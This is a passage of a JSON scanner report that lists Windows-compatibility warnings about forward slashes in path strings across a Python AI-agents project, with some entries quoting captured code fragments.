        "warning": "Line 36: Forward slash in path - 'visualization/'",
        "timestamp": "2025-09-05T17:30:42.320069"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\analyze_agent_work.py",
        "warning": "Line 37: Forward slash in path - 'rl/'",
        "timestamp": "2025-09-05T17:30:42.320074"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\analyze_agent_work.py",
        "warning": "Line 38: Forward slash in path - 'demos/'",
        "timestamp": "2025-09-05T17:30:42.320079"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\analyze_agent_work.py",
        "warning": "Line 39: Forward slash in path - 'core/infrastructure/'",
        "timestamp": "2025-09-05T17:30:42.320084"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\analyze_agent_work.py",
        "warning": "Line 89: Forward slash in path - '**/*.py'",
        "timestamp": "2025-09-05T17:30:42.320116"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\analyze_agent_work.py",
        "warning": "Line 90: Forward slash in path - '**/*.ts'",
        "timestamp": "2025-09-05T17:30:42.320121"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\analyze_agent_work.py",
        "warning": "Line 91: Forward slash in path - '**/*.tsx'",
        "timestamp": "2025-09-05T17:30:42.320128"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\inspect_agent.py",
        "warning": "Line 14: Forward slash in path - 'data/market/financial_data_pipeline.py'",
        "timestamp": "2025-09-05T17:30:42.320433"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\inspect_agent.py",
        "warning": "Line 15: Forward slash in path - 'data/synthetic/business_data_generator.py'",
        "timestamp": "2025-09-05T17:30:42.320441"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\inspect_agent.py",
        "warning": "Line 16: Forward slash in path - 'data/integration/data_agent_integration.py'",
        "timestamp": "2025-09-05T17:30:42.320446"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\inspect_agent.py",
        "warning": "Line 45: Forward slash in path - 'visualization/src/components/NetworkVisualization3D.tsx'",
        "timestamp": "2025-09-05T17:30:42.320466"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\inspect_agent.py",
        "warning": "Line 46: Forward slash in path - 'visualization/src/components/PerformanceDashboard.tsx'",
        "timestamp": "2025-09-05T17:30:42.320472"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\inspect_agent.py",
        "warning": "Line 47: Forward slash in path - 'visualization/src/components/TradingFloorSimulation.tsx'",
        "timestamp": "2025-09-05T17:30:42.320477"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\inspect_agent.py",
        "warning": "Line 48: Forward slash in path - 'backend/visualization_server.py'",
        "timestamp": "2025-09-05T17:30:42.320483"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\inspect_agent.py",
        "warning": "Line 52: Forward slash in path - 'core/infrastructure/real_time_websocket_coordinator.py'",
        "timestamp": "2025-09-05T17:30:42.320488"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\inspect_agent.py",
        "warning": "Line 53: Forward slash in path - 'core/infrastructure/distributed_agent_communication_protocol.py'",
        "timestamp": "2025-09-05T17:30:42.320494"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\inspect_agent.py",
        "warning": "Line 54: Forward slash in path - 'core/infrastructure/production_monitoring_system.py'",
        "timestamp": "2025-09-05T17:30:42.320499"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\inspect_agent.py",
        "warning": "Line 82: Forward slash in path - 'rl/environments/trading_environment.py'",
        "timestamp": "2025-09-05T17:30:42.320522"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\inspect_agent.py",
        "warning": "Line 83: Forward slash in path - 'rl/environments/supply_chain_environment.py'",
        "timestamp": "2025-09-05T17:30:42.320529"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\inspect_agent.py",
        "warning": "Line 84: Forward slash in path - 'rl/algorithms/ppo_agent.py'",
        "timestamp": "2025-09-05T17:30:42.320535"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\inspect_agent.py",
        "warning": "Line 85: Forward slash in path - 'rl/algorithms/networks.py'",
        "timestamp": "2025-09-05T17:30:42.320541"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\inspect_agent.py",
        "warning": "Line 86: Forward slash in path - 'rl/training/curriculum.py'",
        "timestamp": "2025-09-05T17:30:42.320546"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\inspect_agent.py",
        "warning": "Line 87: Forward slash in path - 'rl/training/training_pipeline.py'",
        "timestamp": "2025-09-05T17:30:42.320552"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\inspect_agent.py",
        "warning": "Line 123: Forward slash in path - 'demos/phase4_trading_tournament.py'",
        "timestamp": "2025-09-05T17:30:42.320580"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\inspect_agent.py",
        "warning": "Line 124: Forward slash in path - 'demos/phase4_supply_chain_crisis.py'",
        "timestamp": "2025-09-05T17:30:42.320587"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\inspect_agent.py",
        "warning": "Line 125: Forward slash in path - 'demos/phase4_autonomous_research.py'",
        "timestamp": "2025-09-05T17:30:42.320594"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\inspect_agent.py",
        "warning": "Line 126: Forward slash in path - 'demos/phase4_demo_launcher.py'",
        "timestamp": "2025-09-05T17:30:42.320600"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\rl_training_demo.py",
        "warning": "Line 43: Forward slash in path - \") / f\"",
        "timestamp": "2025-09-05T17:30:42.320981"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\rl_training_demo.py",
        "warning": "Line 96: Forward slash in path - ': crisis_data\n            }\n            \n        else:\n            # Generate basic synthetic data for other environments\n            synthetic_data = generator.generate_complete_dataset(save_to_file=False)\n        \n        # Save synthetic data\n        data_file = self.output_dir / \"",
        "timestamp": "2025-09-05T17:30:42.321025"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\rl_training_demo.py",
        "warning": "Line 225: Forward slash in path - \")\n        \n        # Create PPO configuration\n        ppo_config = PPOConfig(\n            hidden_dims=[256, 256, 128],\n            learning_rate=3e-4,\n            batch_size=256,\n            ppo_epochs=4,\n            epsilon_clip=0.2,\n            entropy_coeff=0.01,\n            value_loss_coeff=0.5,\n            discount_factor=0.99,\n            gae_lambda=0.95,\n            buffer_size=10000,\n            eval_frequency=500,\n            checkpoint_dir=str(self.output_dir / \"",
        "timestamp": "2025-09-05T17:30:42.321112"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\rl_training_demo.py",
        "warning": "Line 292: Forward slash in path - ': 0.8},\n                    min_episodes=500,\n                    advancement_threshold=0.8\n                )\n            ]\n        \n        # Use adaptive scheduler\n        scheduler = AdaptiveCurriculumScheduler(adaptation_rate=0.1)\n        \n        curriculum = CurriculumManager(\n            stages=curriculum_stages,\n            scheduler=scheduler,\n            save_path=str(self.output_dir / \"",
        "timestamp": "2025-09-05T17:30:42.321156"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\rl_training_demo.py",
        "warning": "Line 449: Forward slash in path - ': len([r for r in episode_lengths if r < 1000]) / num_episodes,  # Episodes that didn'",
        "timestamp": "2025-09-05T17:30:42.321256"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\rl_training_demo.py",
        "warning": "Line 485: Forward slash in path - \")\n        \n        # Create reports directory\n        reports_dir = self.output_dir / \"",
        "timestamp": "2025-09-05T17:30:42.321299"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\rl_training_demo.py",
        "warning": "Line 524: Forward slash in path - ', {})\n        }\n        \n        report_file = output_dir / \"",
        "timestamp": "2025-09-05T17:30:42.321345"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\rl_training_demo.py",
        "warning": "Line 540: Forward slash in path - ': results\n        }\n        \n        report_file = output_dir / \"",
        "timestamp": "2025-09-05T17:30:42.321377"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\rl_training_demo.py",
        "warning": "Line 564: Forward slash in path - ')\n                        \n                        plt.subplot(2, 2, 2)\n                        # Moving average\n                        window = min(100, len(rewards) // 10)\n                        if window > 1:\n                            moving_avg = pd.Series(rewards).rolling(window=window).mean()\n                            plt.plot(moving_avg)\n                            plt.title(f'",
        "timestamp": "2025-09-05T17:30:42.321419"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\rl_training_demo.py",
        "warning": "Line 590: Forward slash in path - ')\n                            plt.xticks(rotation=45)\n                    \n                    plt.tight_layout()\n                    plt.savefig(output_dir / \"",
        "timestamp": "2025-09-05T17:30:42.321459"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\rl_training_demo.py",
        "warning": "Line 636: Forward slash in path - ': np.max(accuracies)\n                    }\n                }\n        \n        report_file = output_dir / \"",
        "timestamp": "2025-09-05T17:30:42.321518"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\rl_training_demo.py",
        "warning": "Line 664: Forward slash in path - ': self._calculate_computational_efficiency(training_results)\n            }\n        }\n        \n        report_file = output_dir / \"",
        "timestamp": "2025-09-05T17:30:42.321568"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\rl_training_demo.py",
        "warning": "Line 773: Forward slash in path - ': episodes_completed / training_time,\n            '",
        "timestamp": "2025-09-05T17:30:42.321662"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\rl_training_demo.py",
        "warning": "Line 774: Forward slash in path - ': (training_time * 1000) / episodes_completed,\n            '",
        "timestamp": "2025-09-05T17:30:42.321697"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\rl_training_demo.py",
        "warning": "Line 785: Forward slash in path - ']}/{summary['",
        "timestamp": "2025-09-05T17:30:42.321738"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\rl_training_demo.py",
        "warning": "Line 797: Forward slash in path - ']:.1f} episodes/hour\n\n## Recommendations\n\"",
        "timestamp": "2025-09-05T17:30:42.321777"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\rl_training_demo.py",
        "warning": "Line 803: Forward slash in path - \"\n        \n        md_file = output_dir / \"",
        "timestamp": "2025-09-05T17:30:42.321808"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\setup_rl_framework.py",
        "warning": "Line 15: Forward slash in path - \")\n    \n    requirements_file = Path(__file__).parent / \"",
        "timestamp": "2025-09-05T17:30:42.322157"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\setup_rl_framework.py",
        "warning": "Line 17: Forward slash in path - \" / \"",
        "timestamp": "2025-09-05T17:30:42.322164"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\setup_rl_framework.py",
        "warning": "Line 65: Forward slash in path - \"Run: pip install -r rl/requirements.txt\"",
        "timestamp": "2025-09-05T17:30:42.322189"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\setup_rl_framework.py",
        "warning": "Line 96: Forward slash in path - \"rl/__init__.py\"",
        "timestamp": "2025-09-05T17:30:42.322208"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\setup_rl_framework.py",
        "warning": "Line 97: Forward slash in path - \"rl/environments/__init__.py\"",
        "timestamp": "2025-09-05T17:30:42.322215"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\setup_rl_framework.py",
        "warning": "Line 98: Forward slash in path - \"rl/environments/base_environment.py\"",
        "timestamp": "2025-09-05T17:30:42.322223"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\setup_rl_framework.py",
        "warning": "Line 99: Forward slash in path - \"rl/environments/trading_environment.py\"",
        "timestamp": "2025-09-05T17:30:42.322229"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\setup_rl_framework.py",
        "warning": "Line 100: Forward slash in path - \"rl/algorithms/__init__.py\"",
        "timestamp": "2025-09-05T17:30:42.322236"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\setup_rl_framework.py",
        "warning": "Line 101: Forward slash in path - \"rl/algorithms/ppo_agent.py\"",
        "timestamp": "2025-09-05T17:30:42.322243"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\setup_rl_framework.py",
        "warning": "Line 102: Forward slash in path - \"rl/algorithms/networks.py\"",
        "timestamp": "2025-09-05T17:30:42.322250"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\setup_rl_framework.py",
        "warning": "Line 103: Forward slash in path - \"rl/training/__init__.py\"",
        "timestamp": "2025-09-05T17:30:42.322257"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\setup_rl_framework.py",
        "warning": "Line 104: Forward slash in path - \"rl/training/curriculum.py\"",
        "timestamp": "2025-09-05T17:30:42.322264"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\setup_rl_framework.py",
        "warning": "Line 105: Forward slash in path - \"rl/training/training_pipeline.py\"",
        "timestamp": "2025-09-05T17:30:42.322272"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\setup_rl_framework.py",
        "warning": "Line 108: Forward slash in path - \"data/synthetic_data_generator.py\"",
        "timestamp": "2025-09-05T17:30:42.322281"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\setup_rl_framework.py",
        "warning": "Line 238: Forward slash in path - \"Episode {episode + 1}/3\"",
        "timestamp": "2025-09-05T17:30:42.322345"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\setup_rl_framework.py",
        "warning": "Line 262: Forward slash in path - '\n    \n    demo_file = Path(__file__).parent / \"",
        "timestamp": "2025-09-05T17:30:42.322366"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\setup_rl_framework.py",
        "warning": "Line 319: Forward slash in path - \"4. Check documentation: rl/README.md\"",
        "timestamp": "2025-09-05T17:30:42.322403"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\system_validation_report.py",
        "warning": "Line 388: Forward slash in path - \"\n        ]\n        \n        missing_configs = []\n        for config_file in config_files:\n            if not (self.project_root / config_file).exists():\n                missing_configs.append(config_file)\n        \n        if missing_configs:\n            self.results.append(ComponentValidation(\n                \"",
        "timestamp": "2025-09-05T17:30:42.323000"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\system_validation_report.py",
        "warning": "Line 430: Forward slash in path - \"\n        \n        try:\n            # Test synthetic data generation\n            from pathlib import Path\n            import subprocess\n            \n            # Check if data generator exists\n            data_gen_path = self.project_root / \"",
        "timestamp": "2025-09-05T17:30:42.323033"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\system_validation_report.py",
        "warning": "Line 438: Forward slash in path - \" / \"",
        "timestamp": "2025-09-05T17:30:42.323047"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\system_validation_report.py",
        "warning": "Line 465: Forward slash in path - \",\n        ]\n        \n        for file_path in essential_files:\n            if (self.project_root / file_path).exists():\n                self.results.append(ComponentValidation(\n                    f\"",
        "timestamp": "2025-09-05T17:30:42.323076"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\system_validation_report.py",
        "warning": "Line 523: Forward slash in path - \"\n        \n        # Calculate production readiness score\n        score = (passed * 1.0 + warnings * 0.5) / max(total, 1) * 100\n        \n        # Generate recommendations\n        recommendations = self.generate_recommendations()\n        \n        return SystemValidationReport(\n            timestamp=datetime.now().isoformat(),\n            total_components_tested=total,\n            passed=passed,\n            failed=failed,\n            warnings=warnings,\n            skipped=skipped,\n            overall_status=overall_status,\n            component_results=self.results,\n            production_readiness_score=score,\n            critical_issues=self.critical_issues,\n            recommendations=recommendations,\n            infrastructure_status={\n                \"",
        "timestamp": "2025-09-05T17:30:42.323132"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\system_validation_report.py",
        "warning": "Line 583: Forward slash in path - \"Run comprehensive tests: python -m pytest tests/ -v\"",
        "timestamp": "2025-09-05T17:30:42.323175"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\test_rl_system.py",
        "warning": "Line 283: Forward slash in path - \")\n        \n        # Test checkpoint save/load\n        checkpoint_path = self.temp_dir / \"",
        "timestamp": "2025-09-05T17:30:42.323692"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\test_rl_system.py",
        "warning": "Line 298: Forward slash in path - \"✅ Checkpoint save/load successful\"",
        "timestamp": "2025-09-05T17:30:42.323715"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\test_rl_system.py",
        "warning": "Line 304: Forward slash in path - \")\n        \n        # Create curriculum\n        stages = create_trading_curriculum()\n        curriculum = CurriculumManager(\n            stages=stages,\n            save_path=str(self.temp_dir / \"",
        "timestamp": "2025-09-05T17:30:42.323729"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\test_rl_system.py",
        "warning": "Line 326: Forward slash in path - \")\n                break\n        \n        # Test curriculum state save/load\n        curriculum.save_state()\n        assert (self.temp_dir / \"",
        "timestamp": "2025-09-05T17:30:42.323748"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\test_rl_system.py",
        "warning": "Line 331: Forward slash in path - \").exists()\n        \n        # Create new curriculum and load state\n        new_curriculum = CurriculumManager(stages=stages)\n        new_curriculum.load_state(str(self.temp_dir / \"",
        "timestamp": "2025-09-05T17:30:42.323760"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\test_rl_system.py",
        "warning": "Line 337: Forward slash in path - \"✅ Curriculum state save/load successful\"",
        "timestamp": "2025-09-05T17:30:42.323773"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\test_rl_system.py",
        "warning": "Line 415: Forward slash in path - \")\n        \n        # Check that files were created\n        assert (Path(config.output_dir) / f\"",
        "timestamp": "2025-09-05T17:30:42.323819"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\test_rl_system.py",
        "warning": "Line 459: Forward slash in path - \")\n        \n        # Performance test - run multiple steps\n        import time\n        start_time = time.time()\n        \n        observations, _ = env.reset()\n        \n        for step in range(50):\n            actions = {}\n            for agent_id, agent in agents.items():\n                if agent_id in observations:\n                    action = agent.select_action(observations[agent_id])\n                    actions[agent_id] = action\n            \n            observations, rewards, terminated, truncated, info = env.step(actions)\n            \n            if all(terminated.values()) or all(truncated.values()):\n                break\n        \n        elapsed = time.time() - start_time\n        steps_per_second = step / elapsed if elapsed > 0 else 0\n        \n        print(f\"",
        "timestamp": "2025-09-05T17:30:42.323857"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
        "warning": "Line 73: Forward slash in path - \"\n        Authenticate user with various methods\n        \n        Supported authentication methods:\n        - Username/password\n        - Email/password\n        - API key\n        - OAuth token (future)\n        \"",
        "timestamp": "2025-09-05T17:30:42.324181"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
        "warning": "Line 85: Forward slash in path - \"])\n            \n            # Username/password authentication\n            elif \"",
        "timestamp": "2025-09-05T17:30:42.324193"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
        "warning": "Line 101: Forward slash in path - \"Authenticate using username/email and password\"",
        "timestamp": "2025-09-05T17:30:42.324205"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
        "warning": "Line 106: Forward slash in path - \"Username/email and password required\"",
        "timestamp": "2025-09-05T17:30:42.324214"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
        "warning": "Line 511: Forward slash in path - \"/admin/users\"",
        "timestamp": "2025-09-05T17:30:42.324423"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
        "warning": "Line 537: Forward slash in path - \"/admin/settings\"",
        "timestamp": "2025-09-05T17:30:42.324447"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\database\\session.py",
        "warning": "Line 175: Forward slash in path - \"/api/endpoint\"",
        "timestamp": "2025-09-05T17:30:42.324801"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\database\\session.py",
        "warning": "Line 277: Forward slash in path - \"]\n        max_connections = settings.database.database_pool_size + settings.database.database_pool_max_overflow\n        utilization = (total_connections / max_connections) * 100 if max_connections > 0 else 0\n        \n        return {\n            \"",
        "timestamp": "2025-09-05T17:30:42.324852"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\database\\session.py",
        "warning": "Line 349: Forward slash in path - \"\n        Managed transaction context\n        \n        Automatically handles commit/rollback and ensures proper cleanup\n        \n        Usage:\n            db_manager = DatabaseManager()\n            async with db_manager.transaction() as session:\n                # All operations in this block are in a single transaction\n                user = User(name=\"",
        "timestamp": "2025-09-05T17:30:42.324891"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\base_integration.py",
        "warning": "Line 292: Forward slash in path - \"Integration timeout (attempt {attempt + 1}/{max_retries})\"",
        "timestamp": "2025-09-05T17:30:42.325375"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\base_integration.py",
        "warning": "Line 301: Forward slash in path - \"Integration client error (attempt {attempt + 1}/{max_retries}): {e}\"",
        "timestamp": "2025-09-05T17:30:42.325390"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\base_integration.py",
        "warning": "Line 310: Forward slash in path - \"Integration error (attempt {attempt + 1}/{max_retries}): {e}\"",
        "timestamp": "2025-09-05T17:30:42.325403"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\base_integration.py",
        "warning": "Line 427: Forward slash in path - \"\n        try:\n            # Test connection\n            connection_healthy = await self.test_connection()\n            \n            # Calculate success rate\n            success_rate = 0.0\n            if self.total_requests > 0:\n                success_rate = (self.successful_requests / self.total_requests) * 100\n            \n            return {\n                \"",
        "timestamp": "2025-09-05T17:30:42.325474"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\netsuite_integration.py",
        "warning": "Line 117: Forward slash in path - \"{self.base_url}/services/rest/record/{self.api_version}\"",
        "timestamp": "2025-09-05T17:30:42.325882"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\netsuite_integration.py",
        "warning": "Line 145: Forward slash in path - \"{self.rest_endpoint}/subsidiary\"",
        "timestamp": "2025-09-05T17:30:42.325902"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\netsuite_integration.py",
        "warning": "Line 147: Forward slash in path - \"application/json\"",
